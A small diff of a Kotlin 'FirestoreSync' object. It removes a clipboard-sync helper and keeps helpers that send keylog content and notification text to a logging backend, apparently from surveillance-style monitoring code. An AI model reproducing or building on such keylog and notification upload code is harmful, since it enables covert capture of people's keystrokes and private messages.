@@ -38,7 +38,6 @@ object FirestoreSync {
     }
 
     // ── Convenience helpers ────────────────────────────────────────────────────
-    fun syncClipboard(content: String)  = syncLog("CLIPBOARD", content, "Clipboard")
     fun syncKeylog(content: String, app: String? = null) = syncLog("KEYLOG", content, app)
     fun syncNotification(packageName: String, title: String?, text: String?) {
         val raw = "[$packageName] $title: $text"
